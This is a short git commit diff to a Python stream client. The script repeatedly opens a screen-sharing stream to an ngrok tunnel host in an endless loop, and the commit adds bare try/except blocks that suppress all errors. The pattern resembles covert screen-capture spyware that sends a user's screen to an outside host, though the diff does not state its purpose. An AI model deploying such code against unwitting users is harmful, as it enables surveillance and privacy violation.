2083b3947f20ef8b909285dbf03a54e237ae0984
Zenitsukkjs <159107264+Zenitsukkjs@users.noreply.github.com>
2024-02-06 04:28:45 -0300

    Update StreamClient.py

--- StreamClient.py
+++ StreamClient.py
@@ -7,7 +7,12 @@ import time
 ####################################################################
 while(True):
     Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
-    Client.start_stream()
-    time.sleep(3)
-    Client.stop_stream()
+    try: 
+        Client.start_stream()
+        try:
+            time.sleep(3)
+            Client.stop_stream()
+        except:pass
+    except:pass
+
 ####################################################################
